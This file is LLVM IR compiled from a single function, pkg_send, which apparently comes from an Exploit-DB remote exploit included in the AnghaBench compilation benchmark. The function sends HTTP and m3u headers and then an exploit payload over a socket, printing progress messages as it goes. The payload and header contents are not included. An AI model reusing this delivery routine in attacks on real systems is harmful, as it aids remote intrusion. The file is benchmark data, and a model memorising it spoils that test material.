; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_308.c_pkg_send.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_308.c_pkg_send.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@i = common dso_local global i32 0, align 4
@http = common dso_local global i8** null, align 8
@.str = private unnamed_addr constant [27 x i8] c"Could not send HTTP header\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [32 x i8] c"\09- Sending valid HTTP header..\0A\00", align 1
@m3umuxor = common dso_local global i8** null, align 8
@.str.2 = private unnamed_addr constant [26 x i8] c"Could not send m3u header\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\09- Sending valid m3u header..\0A\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"Could not send payload\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"\09- Sending payload package..\0A\00", align 1
@SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @pkg_send(i32 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  store i32 0, i32* @i, align 4
  br label %5

5:                                                ; preds = %26, %2
  %6 = load i32, i32* @i, align 4
  %7 = icmp slt i32 %6, 8
  br i1 %7, label %8, label %29

8:                                                ; preds = %5
  %9 = load i32, i32* %3, align 4
  %10 = load i8**, i8*** @http, align 8
  %11 = load i32, i32* @i, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %10, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = load i8**, i8*** @http, align 8
  %16 = load i32, i32* @i, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8*, i8** %15, i64 %17
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @strlen(i8* %19)
  %21 = call i32 @send(i32 %9, i8* %14, i32 %20, i32 0)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %25

23:                                               ; preds = %8
  %24 = call i32 @die(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  br label %25

25:                                               ; preds = %23, %8
  br label %26

26:                                               ; preds = %25
  %27 = load i32, i32* @i, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* @i, align 4
  br label %5

29:                                               ; preds = %5
  %30 = load i32, i32* @stderr, align 4
  %31 = call i32 @fprintf(i32 %30, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %32 = call i32 @sleep(i32 1)
  store i32 0, i32* @i, align 4
  br label %33

33:                                               ; preds = %54, %29
  %34 = load i32, i32* @i, align 4
  %35 = icmp slt i32 %34, 3
  br i1 %35, label %36, label %57

36:                                               ; preds = %33
  %37 = load i32, i32* %3, align 4
  %38 = load i8**, i8*** @m3umuxor, align 8
  %39 = load i32, i32* @i, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8*, i8** %38, i64 %40
  %42 = load i8*, i8** %41, align 8
  %43 = load i8**, i8*** @m3umuxor, align 8
  %44 = load i32, i32* @i, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8*, i8** %43, i64 %45
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strlen(i8* %47)
  %49 = call i32 @send(i32 %37, i8* %42, i32 %48, i32 0)
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %53

51:                                               ; preds = %36
  %52 = call i32 @die(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  br label %53

53:                                               ; preds = %51, %36
  br label %54

54:                                               ; preds = %53
  %55 = load i32, i32* @i, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* @i, align 4
  br label %33

57:                                               ; preds = %33
  %58 = load i32, i32* @stderr, align 4
  %59 = call i32 @fprintf(i32 %58, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0))
  %60 = call i32 @sleep(i32 1)
  %61 = load i32, i32* %3, align 4
  %62 = load i8*, i8** %4, align 8
  %63 = load i8*, i8** %4, align 8
  %64 = call i32 @strlen(i8* %63)
  %65 = call i32 @send(i32 %61, i8* %62, i32 %64, i32 0)
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %69

67:                                               ; preds = %57
  %68 = call i32 @die(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  br label %69

69:                                               ; preds = %67, %57
  %70 = load i32, i32* @stderr, align 4
  %71 = call i32 @fprintf(i32 %70, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0))
  %72 = load i32, i32* @SUCCESS, align 4
  ret i32 %72
}

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @die(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
